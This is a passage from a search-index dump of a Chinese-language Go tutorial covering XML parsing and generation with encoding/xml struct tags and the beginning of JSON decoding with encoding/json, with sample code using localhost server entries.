os.Open(\"servers.xml\") // For read access.     \nif err != nil {\nfmt.Printf(\"error: %v\", err)\nreturn\n}\ndefer file.Close()\ndata, err := ioutil.ReadAll(file)\nif err != nil {\nfmt.Printf(\"error: %v\", err)\nreturn\n}\nv := Recurlyservers{}\nerr = xml.Unmarshal(data, &amp;v)\nif err != nil {\nfmt.Printf(\"error: %v\", err)\nreturn\n}\n\nfmt.Println(v)\n}\n</code></pre> XML\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u6811\u5f62\u7684\u6570\u636e\u683c\u5f0f\uff0c\u800c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e0e\u4e4b\u5339\u914d\u7684go \u8bed\u8a00\u7684 struct\u7c7b\u578b\uff0c\u7136\u540e\u901a\u8fc7xml.Unmarshal\u6765\u5c06xml\u4e2d\u7684\u6570\u636e\u89e3\u6790\u6210\u5bf9\u5e94\u7684struct\u5bf9\u8c61\u3002\u5982\u4e0a\u4f8b\u5b50\u8f93\u51fa\u5982\u4e0b\u6570\u636e <pre><code>{{ servers} 1 [{{ server} Shanghai_VPN 127.0.0.1} {{ server} Beijing_VPN 127.0.0.2}]\n&lt;server&gt;\n&lt;serverName&gt;Shanghai_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.1&lt;/serverIP&gt;\n&lt;/server&gt;\n&lt;server&gt;\n&lt;serverName&gt;Beijing_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.2&lt;/serverIP&gt;\n&lt;/server&gt;\n}\n</code></pre> \u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u5c06xml\u6587\u4ef6\u89e3\u6790\u6210\u5bf9\u5e94\u7684struct\u5bf9\u8c61\u662f\u901a\u8fc7<code>xml.Unmarshal</code>\u6765\u5b8c\u6210\u7684\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u5982\u4f55\u5b9e\u73b0\u7684\uff1f\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684struct\u5b9a\u4e49\u540e\u9762\u591a\u4e86\u4e00\u4e9b\u7c7b\u4f3c\u4e8e<code>xml:\"serverName\"</code>\u8fd9\u6837\u7684\u5185\u5bb9,\u8fd9\u4e2a\u662fstruct\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u5b83\u4eec\u88ab\u79f0\u4e3a struct tag\uff0c\u5b83\u4eec\u662f\u7528\u6765\u8f85\u52a9\u53cd\u5c04\u7684\u3002\u6211\u4eec\u6765\u770b\u4e00\u4e0b<code>Unmarshal</code>\u7684\u5b9a\u4e49\uff1a <pre><code>func Unmarshal(data []byte, v interface{}) error\n</code></pre> \u6211\u4eec\u770b\u5230\u51fd\u6570\u5b9a\u4e49\u4e86\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662fXML\u6570\u636e\u6d41\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5b58\u50a8\u7684\u5bf9\u5e94\u7c7b\u578b\uff0c\u76ee\u524d\u652f\u6301struct\u3001slice\u548cstring\uff0cXML\u5305\u5185\u90e8\u91c7\u7528\u4e86\u53cd\u5c04\u6765\u8fdb\u884c\u6570\u636e\u7684\u6620\u5c04\uff0c\u6240\u4ee5v\u91cc\u9762\u7684\u5b57\u6bb5\u5fc5\u987b\u662f\u5bfc\u51fa\u7684\u3002<code>Unmarshal</code>\u89e3\u6790\u7684\u65f6\u5019XML\u5143\u7d20\u548c\u5b57\u6bb5\u600e\u4e48\u5bf9\u5e94\u8d77\u6765\u7684\u5462\uff1f\u8fd9\u662f\u6709\u4e00\u4e2a\u4f18\u5148\u7ea7\u8bfb\u53d6\u6d41\u7a0b\u7684\uff0c\u9996\u5148\u4f1a\u8bfb\u53d6struct tag\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bf9\u5e94\u5b57\u6bb5\u540d\u3002\u5fc5\u987b\u6ce8\u610f\u4e00\u70b9\u7684\u662f\u89e3\u6790\u7684\u65f6\u5019tag\u3001\u5b57\u6bb5\u540d\u3001XML\u5143\u7d20\u90fd\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\uff0c\u6240\u4ee5\u5fc5\u987b\u4e00\u4e00\u5bf9\u5e94\u5b57\u6bb5\u3002</p> <p>Go\u8bed\u8a00\u7684\u53cd\u5c04\u673a\u5236\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9btag\u4fe1\u606f\u6765\u5c06\u6765\u81eaXML\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u53cd\u5c04\u6210\u5bf9\u5e94\u7684struct\u5bf9\u8c61\uff0c\u5173\u4e8e\u53cd\u5c04\u5982\u4f55\u5229\u7528struct tag\u7684\u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u9605reflect\u4e2d\u7684\u76f8\u5173\u5185\u5bb9\u3002</p> <p>\u89e3\u6790XML\u5230struct\u7684\u65f6\u5019\u9075\u5faa\u5982\u4e0b\u7684\u89c4\u5219\uff1a</p> <ul> <li>\u5982\u679cstruct\u7684\u4e00\u4e2a\u5b57\u6bb5\u662fstring\u6216\u8005[]byte\u7c7b\u578b\u4e14\u5b83\u7684tag\u542b\u6709<code>\",innerxml\"</code>\uff0cUnmarshal\u5c06\u4f1a\u5c06\u6b64\u5b57\u6bb5\u6240\u5bf9\u5e94\u7684\u5143\u7d20\u5185\u6240\u6709\u5185\u5d4c\u7684\u539f\u59cbxml\u7d2f\u52a0\u5230\u6b64\u5b57\u6bb5\u4e0a\uff0c\u5982\u4e0a\u9762\u4f8b\u5b50Description\u5b9a\u4e49\u3002\u6700\u540e\u7684\u8f93\u51fa\u662f</li> </ul> <pre><code>    &lt;server&gt;\n&lt;serverName&gt;Shanghai_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.1&lt;/serverIP&gt;\n&lt;/server&gt;\n&lt;server&gt;\n&lt;serverName&gt;Beijing_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.2&lt;/serverIP&gt;\n&lt;/server&gt;\n</code></pre> <ul> <li>\u5982\u679cstruct\u4e2d\u6709\u4e00\u4e2a\u53eb\u505aXMLName\uff0c\u4e14\u7c7b\u578b\u4e3axml.Name\u5b57\u6bb5\uff0c\u90a3\u4e48\u5728\u89e3\u6790\u7684\u65f6\u5019\u5c31\u4f1a\u4fdd\u5b58\u8fd9\u4e2aelement\u7684\u540d\u5b57\u5230\u8be5\u5b57\u6bb5,\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\u7684servers\u3002</li> <li>\u5982\u679c\u67d0\u4e2astruct\u5b57\u6bb5\u7684tag\u5b9a\u4e49\u4e2d\u542b\u6709XML\u7ed3\u6784\u4e2delement\u7684\u540d\u79f0\uff0c\u90a3\u4e48\u89e3\u6790\u7684\u65f6\u5019\u5c31\u4f1a\u628a\u76f8\u5e94\u7684element\u503c\u8d4b\u503c\u7ed9\u8be5\u5b57\u6bb5\uff0c\u5982\u4e0aservername\u548cserverip\u5b9a\u4e49\u3002</li> <li>\u5982\u679c\u67d0\u4e2astruct\u5b57\u6bb5\u7684tag\u5b9a\u4e49\u4e86\u4e2d\u542b\u6709<code>\",attr\"</code>\uff0c\u90a3\u4e48\u89e3\u6790\u7684\u65f6\u5019\u5c31\u4f1a\u5c06\u8be5\u7ed3\u6784\u6240\u5bf9\u5e94\u7684element\u7684\u4e0e\u5b57\u6bb5\u540c\u540d\u7684\u5c5e\u6027\u7684\u503c\u8d4b\u503c\u7ed9\u8be5\u5b57\u6bb5\uff0c\u5982\u4e0aversion\u5b9a\u4e49\u3002</li> <li>\u5982\u679c\u67d0\u4e2astruct\u5b57\u6bb5\u7684tag\u5b9a\u4e49 \u578b\u5982<code>\"a&gt;b&gt;c\"</code>,\u5219\u89e3\u6790\u7684\u65f6\u5019\uff0c\u4f1a\u5c06xml\u7ed3\u6784a\u4e0b\u9762\u7684b\u4e0b\u9762\u7684c\u5143\u7d20\u7684\u503c\u8d4b\u503c\u7ed9\u8be5\u5b57\u6bb5\u3002</li> <li>\u5982\u679c\u67d0\u4e2astruct\u5b57\u6bb5\u7684tag\u5b9a\u4e49\u4e86<code>\"-\"</code>,\u90a3\u4e48\u4e0d\u4f1a\u4e3a\u8be5\u5b57\u6bb5\u89e3\u6790\u5339\u914d\u4efb\u4f55xml\u6570\u636e\u3002</li> <li>\u5982\u679cstruct\u5b57\u6bb5\u540e\u9762\u7684tag\u5b9a\u4e49\u4e86<code>\",any\"</code>\uff0c\u5982\u679c\u4ed6\u7684\u5b50\u5143\u7d20\u5728\u4e0d\u6ee1\u8db3\u5176\u4ed6\u7684\u89c4\u5219\u7684\u65f6\u5019\u5c31\u4f1a\u5339\u914d\u5230\u8fd9\u4e2a\u5b57\u6bb5\u3002</li> <li>\u5982\u679c\u67d0\u4e2aXML\u5143\u7d20\u5305\u542b\u4e00\u6761\u6216\u8005\u591a\u6761\u6ce8\u91ca\uff0c\u90a3\u4e48\u8fd9\u4e9b\u6ce8\u91ca\u5c06\u88ab\u7d2f\u52a0\u5230\u7b2c\u4e00\u4e2atag\u542b\u6709\",comments\"\u7684\u5b57\u6bb5\u4e0a\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u7684\u7c7b\u578b\u53ef\u80fd\u662f[]byte\u6216string,\u5982\u679c\u6ca1\u6709\u8fd9\u6837\u7684\u5b57\u6bb5\u5b58\u5728\uff0c\u90a3\u4e48\u6ce8\u91ca\u5c06\u4f1a\u88ab\u629b\u5f03\u3002</li> </ul> <p>\u4e0a\u9762\u8be6\u7ec6\u8bb2\u8ff0\u4e86\u5982\u4f55\u5b9a\u4e49struct\u7684tag\u3002 \u53ea\u8981\u8bbe\u7f6e\u5bf9\u4e86tag\uff0c\u90a3\u4e48XML\u89e3\u6790\u5c31\u5982\u4e0a\u9762\u793a\u4f8b\u822c\u7b80\u5355\uff0ctag\u548cXML\u7684element\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb\uff0c\u5982\u4e0a\u6240\u793a\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7slice\u6765\u8868\u793a\u591a\u4e2a\u540c\u7ea7\u5143\u7d20\u3002</p> <p>\u6ce8\u610f\uff1a \u4e3a\u4e86\u6b63\u786e\u89e3\u6790\uff0cgo\u8bed\u8a00\u7684xml\u5305\u8981\u6c42struct\u5b9a\u4e49\u4e2d\u7684\u6240\u6709\u5b57\u6bb5\u5fc5\u987b\u662f\u53ef\u5bfc\u51fa\u7684\uff08\u5373\u9996\u5b57\u6bcd\u5927\u5199\uff09</p>"},{"location":"07.1/#xml_1","title":"\u8f93\u51faXML","text":"<p>\u5047\u82e5\u6211\u4eec\u4e0d\u662f\u8981\u89e3\u6790\u5982\u4e0a\u6240\u793a\u7684XML\u6587\u4ef6\uff0c\u800c\u662f\u751f\u6210\u5b83\uff0c\u90a3\u4e48\u5728go\u8bed\u8a00\u4e2d\u53c8\u8be5\u5982\u4f55\u5b9e\u73b0\u5462\uff1f xml\u5305\u4e2d\u63d0\u4f9b\u4e86<code>Marshal</code>\u548c<code>MarshalIndent</code>\u4e24\u4e2a\u51fd\u6570\uff0c\u6765\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\u3002\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e3b\u8981\u7684\u533a\u522b\u662f\u7b2c\u4e8c\u4e2a\u51fd\u6570\u4f1a\u589e\u52a0\u524d\u7f00\u548c\u7f29\u8fdb\uff0c\u51fd\u6570\u7684\u5b9a\u4e49\u5982\u4e0b\u6240\u793a\uff1a <pre><code>func Marshal(v interface{}) ([]byte, error)\nfunc MarshalIndent(v interface{}, prefix, indent string) ([]byte, error)\n</code></pre> \u4e24\u4e2a\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u7528\u6765\u751f\u6210XML\u7684\u7ed3\u6784\u5b9a\u4e49\u7c7b\u578b\u6570\u636e\uff0c\u90fd\u662f\u8fd4\u56de\u751f\u6210\u7684XML\u6570\u636e\u6d41\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u5982\u4f55\u8f93\u51fa\u5982\u4e0a\u7684XML\uff1a <pre><code>package main\n\nimport (\n\"encoding/xml\"\n\"fmt\"\n\"os\"\n)\n\ntype Servers struct {\nXMLName xml.Name `xml:\"servers\"`\nVersion string   `xml:\"version,attr\"`\nSvs     []server `xml:\"server\"`\n}\n\ntype server struct {\nServerName string `xml:\"serverName\"`\nServerIP   string `xml:\"serverIP\"`\n}\n\nfunc main() {\nv := &amp;Servers{Version: \"1\"}\nv.Svs = append(v.Svs, server{\"Shanghai_VPN\", \"127.0.0.1\"})\nv.Svs = append(v.Svs, server{\"Beijing_VPN\", \"127.0.0.2\"})\noutput, err := xml.MarshalIndent(v, \"  \", \"    \")\nif err != nil {\nfmt.Printf(\"error: %v\\n\", err)\n}\nos.Stdout.Write([]byte(xml.Header))\n\nos.Stdout.Write(output)\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u8f93\u51fa\u5982\u4e0b\u4fe1\u606f\uff1a <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;servers version=\"1\"&gt;\n&lt;server&gt;\n&lt;serverName&gt;Shanghai_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.1&lt;/serverIP&gt;\n&lt;/server&gt;\n&lt;server&gt;\n&lt;serverName&gt;Beijing_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.2&lt;/serverIP&gt;\n&lt;/server&gt;\n&lt;/servers&gt;\n</code></pre> \u548c\u6211\u4eec\u4e4b\u524d\u5b9a\u4e49\u7684\u6587\u4ef6\u7684\u683c\u5f0f\u4e00\u6a21\u4e00\u6837\uff0c\u4e4b\u6240\u4ee5\u4f1a\u6709<code>os.Stdout.Write([]byte(xml.Header))</code> \u8fd9\u53e5\u4ee3\u7801\u7684\u51fa\u73b0\uff0c\u662f\u56e0\u4e3a<code>xml.MarshalIndent</code>\u6216\u8005<code>xml.Marshal</code>\u8f93\u51fa\u7684\u4fe1\u606f\u90fd\u662f\u4e0d\u5e26XML\u5934\u7684\uff0c\u4e3a\u4e86\u751f\u6210\u6b63\u786e\u7684xml\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528\u4e86xml\u5305\u9884\u5b9a\u4e49\u7684Header\u53d8\u91cf\u3002</p> <p>\u6211\u4eec\u770b\u5230<code>Marshal</code>\u51fd\u6570\u63a5\u6536\u7684\u53c2\u6570v\u662finterface{}\u7c7b\u578b\u7684\uff0c\u5373\u5b83\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u53c2\u6570\uff0c\u90a3\u4e48xml\u5305\uff0c\u6839\u636e\u4ec0\u4e48\u89c4\u5219\u6765\u751f\u6210\u76f8\u5e94\u7684XML\u6587\u4ef6\u5462\uff1f</p> <ul> <li>\u5982\u679cv\u662f array\u6216\u8005slice\uff0c\u90a3\u4e48\u8f93\u51fa\u6bcf\u4e00\u4e2a\u5143\u7d20\uff0c\u7c7b\u4f3cvalue</li> <li>\u5982\u679cv\u662f\u6307\u9488\uff0c\u90a3\u4e48\u4f1aMarshal\u6307\u9488\u6307\u5411\u7684\u5185\u5bb9\uff0c\u5982\u679c\u6307\u9488\u4e3a\u7a7a\uff0c\u4ec0\u4e48\u90fd\u4e0d\u8f93\u51fa</li> <li>\u5982\u679cv\u662finterface\uff0c\u90a3\u4e48\u5c31\u5904\u7406interface\u6240\u5305\u542b\u7684\u6570\u636e</li> <li>\u5982\u679cv\u662f\u5176\u4ed6\u6570\u636e\u7c7b\u578b\uff0c\u5c31\u4f1a\u8f93\u51fa\u8fd9\u4e2a\u6570\u636e\u7c7b\u578b\u6240\u62e5\u6709\u7684\u5b57\u6bb5\u4fe1\u606f</li> </ul> <p>\u751f\u6210\u7684XML\u6587\u4ef6\u4e2d\u7684element\u7684\u540d\u5b57\u53c8\u662f\u6839\u636e\u4ec0\u4e48\u51b3\u5b9a\u7684\u5462\uff1f\u5143\u7d20\u540d\u6309\u7167\u5982\u4e0b\u4f18\u5148\u7ea7\u4ecestruct\u4e2d\u83b7\u53d6\uff1a</p> <ul> <li>\u5982\u679cv\u662fstruct\uff0cXMLName\u7684tag\u4e2d\u5b9a\u4e49\u7684\u540d\u79f0</li> <li>\u7c7b\u578b\u4e3axml.Name\u7684\u540d\u53ebXMLName\u7684\u5b57\u6bb5\u7684\u503c</li> <li>\u901a\u8fc7struct\u4e2d\u5b57\u6bb5\u7684tag\u6765\u83b7\u53d6</li> <li>\u901a\u8fc7struct\u7684\u5b57\u6bb5\u540d\u7528\u6765\u83b7\u53d6</li> <li>marshall\u7684\u7c7b\u578b\u540d\u79f0</li> </ul> <p>\u6211\u4eec\u5e94\u5982\u4f55\u8bbe\u7f6estruct \u4e2d\u5b57\u6bb5\u7684tag\u4fe1\u606f\u4ee5\u63a7\u5236\u6700\u7ec8xml\u6587\u4ef6\u7684\u751f\u6210\u5462\uff1f</p> <ul> <li>XMLName\u4e0d\u4f1a\u88ab\u8f93\u51fa</li> <li>tag\u4e2d\u542b\u6709<code>\"-\"</code>\u7684\u5b57\u6bb5\u4e0d\u4f1a\u8f93\u51fa</li> <li>tag\u4e2d\u542b\u6709<code>\"name,attr\"</code>\uff0c\u4f1a\u4ee5name\u4f5c\u4e3a\u5c5e\u6027\u540d\uff0c\u5b57\u6bb5\u503c\u4f5c\u4e3a\u503c\u8f93\u51fa\u4e3a\u8fd9\u4e2aXML\u5143\u7d20\u7684\u5c5e\u6027\uff0c\u5982\u4e0aversion\u5b57\u6bb5\u6240\u63cf\u8ff0</li> <li>tag\u4e2d\u542b\u6709<code>\",attr\"</code>\uff0c\u4f1a\u4ee5\u8fd9\u4e2astruct\u7684\u5b57\u6bb5\u540d\u4f5c\u4e3a\u5c5e\u6027\u540d\u8f93\u51fa\u4e3aXML\u5143\u7d20\u7684\u5c5e\u6027\uff0c\u7c7b\u4f3c\u4e0a\u4e00\u6761\uff0c\u53ea\u662f\u8fd9\u4e2aname\u9ed8\u8ba4\u662f\u5b57\u6bb5\u540d\u4e86\u3002</li> <li>tag\u4e2d\u542b\u6709<code>\",chardata\"</code>\uff0c\u8f93\u51fa\u4e3axml\u7684 character data\u800c\u975eelement\u3002</li> <li>tag\u4e2d\u542b\u6709<code>\",innerxml\"</code>\uff0c\u5c06\u4f1a\u88ab\u539f\u6837\u8f93\u51fa\uff0c\u800c\u4e0d\u4f1a\u8fdb\u884c\u5e38\u89c4\u7684\u7f16\u7801\u8fc7\u7a0b</li> <li>tag\u4e2d\u542b\u6709<code>\",comment\"</code>\uff0c\u5c06\u88ab\u5f53\u4f5cxml\u6ce8\u91ca\u6765\u8f93\u51fa\uff0c\u800c\u4e0d\u4f1a\u8fdb\u884c\u5e38\u89c4\u7684\u7f16\u7801\u8fc7\u7a0b\uff0c\u5b57\u6bb5\u503c\u4e2d\u4e0d\u80fd\u542b\u6709\"--\"\u5b57\u7b26\u4e32</li> <li>tag\u4e2d\u542b\u6709<code>\"omitempty\"</code>,\u5982\u679c\u8be5\u5b57\u6bb5\u7684\u503c\u4e3a\u7a7a\u503c\u90a3\u4e48\u8be5\u5b57\u6bb5\u5c31\u4e0d\u4f1a\u88ab\u8f93\u51fa\u5230XML\uff0c\u7a7a\u503c\u5305\u62ec\uff1afalse\u30010\u3001nil\u6307\u9488\u6216nil\u63a5\u53e3\uff0c\u4efb\u4f55\u957f\u5ea6\u4e3a0\u7684array, slice, map\u6216\u8005string</li> <li>tag\u4e2d\u542b\u6709<code>\"a&gt;b&gt;c\"</code>\uff0c\u90a3\u4e48\u5c31\u4f1a\u5faa\u73af\u8f93\u51fa\u4e09\u4e2a\u5143\u7d20a\u5305\u542bb\uff0cb\u5305\u542bc\uff0c\u4f8b\u5982\u5982\u4e0b\u4ee3\u7801\u5c31\u4f1a\u8f93\u51fa</li> </ul> <p><pre><code>    FirstName string   `xml:\"name&gt;first\"`\n    LastName  string   `xml:\"name&gt;last\"`\n\n    &lt;name&gt;\n&lt;first&gt;Asta&lt;/first&gt;\n&lt;last&gt;Xie&lt;/last&gt;\n&lt;/name&gt;\n</code></pre> \u4e0a\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528Go\u8bed\u8a00\u7684xml\u5305\u6765\u7f16/\u89e3\u7801XML\u6587\u4ef6\uff0c\u91cd\u8981\u7684\u4e00\u70b9\u662f\u5bf9XML\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u662f\u901a\u8fc7struct tag\u6765\u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u5b66\u4f1a\u5bf9struct tag\u7684\u8fd0\u7528\u53d8\u5f97\u975e\u5e38\u91cd\u8981\uff0c\u5728\u6587\u7ae0\u4e2d\u6211\u4eec\u7b80\u8981\u7684\u5217\u4e3e\u4e86\u5982\u4f55\u5b9a\u4e49tag\u3002\u66f4\u591a\u5185\u5bb9\u6216tag\u5b9a\u4e49\u8bf7\u53c2\u770b\u76f8\u5e94\u7684\u5b98\u65b9\u8d44\u6599\u3002</p>"},{"location":"07.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u6587\u672c\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: Json\u5904\u7406</li> </ul>"},{"location":"07.2/","title":"7.2 JSON\u5904\u7406","text":"<p>JSON\uff08Javascript Object Notation\uff09\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684\u6570\u636e\u4ea4\u6362\u8bed\u8a00\uff0c\u4ee5\u6587\u5b57\u4e3a\u57fa\u7840\uff0c\u5177\u6709\u81ea\u6211\u63cf\u8ff0\u6027\u4e14\u6613\u4e8e\u8ba9\u4eba\u9605\u8bfb\u3002\u5c3d\u7ba1JSON\u662fJavascript\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u4f46JSON\u662f\u72ec\u7acb\u4e8e\u8bed\u8a00\u7684\u6587\u672c\u683c\u5f0f\uff0c\u5e76\u4e14\u91c7\u7528\u4e86\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\u5bb6\u65cf\u7684\u4e00\u4e9b\u4e60\u60ef\u3002JSON\u4e0eXML\u6700\u5927\u7684\u4e0d\u540c\u5728\u4e8eXML\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u6807\u8bb0\u8bed\u8a00\uff0c\u800cJSON\u4e0d\u662f\u3002JSON\u7531\u4e8e\u6bd4XML\u66f4\u5c0f\u3001\u66f4\u5feb\uff0c\u66f4\u6613\u89e3\u6790,\u4ee5\u53ca\u6d4f\u89c8\u5668\u7684\u5185\u5efa\u5feb\u901f\u89e3\u6790\u652f\u6301,\u4f7f\u5f97\u5176\u66f4\u9002\u7528\u4e8e\u7f51\u7edc\u6570\u636e\u4f20\u8f93\u9886\u57df\u3002\u76ee\u524d\u6211\u4eec\u770b\u5230\u5f88\u591a\u7684\u5f00\u653e\u5e73\u53f0\uff0c\u57fa\u672c\u4e0a\u90fd\u662f\u91c7\u7528\u4e86JSON\u4f5c\u4e3a\u4ed6\u4eec\u7684\u6570\u636e\u4ea4\u4e92\u7684\u63a5\u53e3\u3002\u65e2\u7136JSON\u5728Web\u5f00\u53d1\u4e2d\u5982\u6b64\u91cd\u8981\uff0c\u90a3\u4e48Go\u8bed\u8a00\u5bf9JSON\u652f\u6301\u7684\u600e\u4e48\u6837\u5462\uff1fGo\u8bed\u8a00\u7684\u6807\u51c6\u5e93\u5df2\u7ecf\u975e\u5e38\u597d\u7684\u652f\u6301\u4e86JSON\uff0c\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5bf9JSON\u6570\u636e\u8fdb\u884c\u7f16\u3001\u89e3\u7801\u7684\u5de5\u4f5c\u3002</p> <p>\u524d\u4e00\u5c0f\u8282\u7684\u8fd0\u7ef4\u7684\u4f8b\u5b50\u7528json\u6765\u8868\u793a\uff0c\u7ed3\u679c\u63cf\u8ff0\u5982\u4e0b\uff1a <pre><code>{\"servers\":[{\"serverName\":\"Shanghai_VPN\",\"serverIP\":\"127.0.0.1\"},{\"serverName\":\"Beijing_VPN\",\"serverIP\":\"127.0.0.2\"}]}\n</code></pre> \u672c\u5c0f\u8282\u4f59\u4e0b\u7684\u5185\u5bb9\u5c06\u4ee5\u6b64JSON\u6570\u636e\u4e3a\u57fa\u7840\uff0c\u6765\u4ecb\u7ecdgo\u8bed\u8a00\u7684json\u5305\u5bf9JSON\u6570\u636e\u7684\u7f16\u3001\u89e3\u7801\u3002</p>"},{"location":"07.2/#json","title":"\u89e3\u6790JSON","text":""},{"location":"07.2/#_1","title":"\u89e3\u6790\u5230\u7ed3\u6784\u4f53","text":"<p>\u5047\u5982\u6709\u4e86\u4e0a\u9762\u7684JSON\u4e32\uff0c\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u6765\u89e3\u6790\u8fd9\u4e2aJSON\u4e32\u5462\uff1fGo\u7684JSON\u5305\u4e2d\u6709\u5982\u4e0b\u51fd\u6570 <pre><code>func Unmarshal(data []byte, v interface{}) error\n</code></pre> \u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u89e3\u6790\u7684\u76ee\u7684\uff0c\u8be6\u7ec6\u7684\u89e3\u6790\u4f8b\u5b50\u8bf7\u770b\u5982\u4e0b\u4ee3\u7801\uff1a <pre><code>package main\n\nimport (\n\"encoding/json\"\n\"fmt\"\n)\n\ntype Server struct {\nServerName string\nServerIP   string\n}\n\ntype Serverslice struct {\nServers []Server\n}\n\nfunc main() {\nvar s Serverslice\nstr := `{\"servers\":[{\"serverName\":\"Shanghai_VPN\",\"serverIP\":\"127.0.0.1\"},{\"serverName\":\"Beijing_VPN\",\"serverIP\":\"127.0.0.2\"}]}`\njson.Unmarshal([]byte(str), &amp;s)\nfmt.Println(s)\n}\n</code></pre> \u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u5b9a\u4e49\u4e86\u4e0ejson\u6570\u636e\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\uff0c\u6570\u7ec4\u5bf9\u5e94slice\uff0c\u5b57\u6bb5\u540d\u5bf9\u5e94JSON\u91cc\u9762\u7684KEY\uff0c\u5728\u89e3\u6790\u7684\u65f6\u5019\uff0c\u5982\u4f55\u5c06json\u6570\u636e\u4e0estruct\u5b57\u6bb5\u76f8\u5339\u914d\u5462\uff1f\u4f8b\u5982JSON\u7684key\u662f<code>Foo</code>\uff0c\u90a3\u4e48\u600e\u4e48\u627e\u5bf9\u5e94\u7684\u5b57\u6bb5\u5462\uff1f</p> <ul> <li>\u9996\u5148\u67e5\u627etag\u542b\u6709<code>Foo</code>\u7684\u53ef\u5bfc\u51fa\u7684struct\u5b57\u6bb5(\u9996\u5b57\u6bcd\u5927\u5199)</li> <li>\u5176\u6b21\u67e5\u627e\u5b57\u6bb5\u540d\u662f<code>Foo</code>\u7684\u5bfc\u51fa\u5b57\u6bb5</li> <li>\u6700\u540e\u67e5\u627e\u7c7b\u4f3c<code>FOO</code>\u6216\u8005<code>FoO</code>\u8fd9\u6837\u7684\u9664\u4e86\u9996\u5b57\u6bcd\u4e4b\u5916\u5176\u4ed6\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\u5bfc\u51fa\u5b57\u6bb5</li> </ul> <p>\u806a\u660e\u7684\u4f60\u4e00\u5b9a\u6ce8\u610f\u5230\u4e86\u8fd9\u4e00\u70b9\uff1a\u80fd\u591f\u88ab\u8d4b\u503c\u7684\u5b57\u6bb5\u5fc5\u987b\u662f\u53ef\u5bfc\u51fa\u5b57\u6bb5(\u5373\u9996\u5b57\u6bcd\u5927\u5199\uff09\u3002\u540c\u65f6JSON\u89e3\u6790\u7684\u65f6\u5019\u53ea\u4f1a\u89e3\u6790\u80fd\u627e\u5f97\u5230\u7684\u5b57\u6bb5\uff0c\u627e\u4e0d\u5230\u7684\u5b57\u6bb5\u4f1a\u88ab\u5ffd\u7565\uff0c\u8fd9\u6837\u7684\u4e00\u4e2a\u597d\u5904\u662f\uff1a\u5f53\u4f60\u63a5\u6536\u5230\u4e00\u4e2a\u5f88\u5927\u7684JSON\u6570\u636e\u7ed3\u6784\u800c\u4f60\u5374\u53ea\u60f3\u83b7\u53d6\u5176\u4e2d\u7684\u90e8\u5206\u6570\u636e\u7684\u65f6\u5019\uff0c\u4f60\u53ea\u9700\u5c06\u4f60\u60f3\u8981\u7684\u6570\u636e\u5bf9\u5e94\u7684\u5b57\u6bb5\u540d\u5927\u5199\uff0c\u5373\u53ef\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p>"},{"location":"07.2/#interface","title":"\u89e3\u6790\u5230interface","text":"<p>\u4e0a\u9762\u90a3\u79cd\u89e3\u6790\u65b9\u5f0f\u662f\u5728\u6211\u4eec\u77e5\u6653\u88ab\u89e3\u6790\u7684JSON\u6570\u636e\u7684\u7ed3\u6784\u7684\u524d\u63d0\u4e0b\u91c7\u53d6\u7684\u65b9\u6848\uff0c\u5982\u679c\u6211\u4eec\u4e0d\u77e5\u9053\u88ab\u89e3\u6790\u7684\u6570\u636e\u7684\u683c\u5f0f\uff0c\u53c8\u5e94\u8be5\u5982\u4f55\u6765\u89e3\u6790\u5462\uff1f</p> 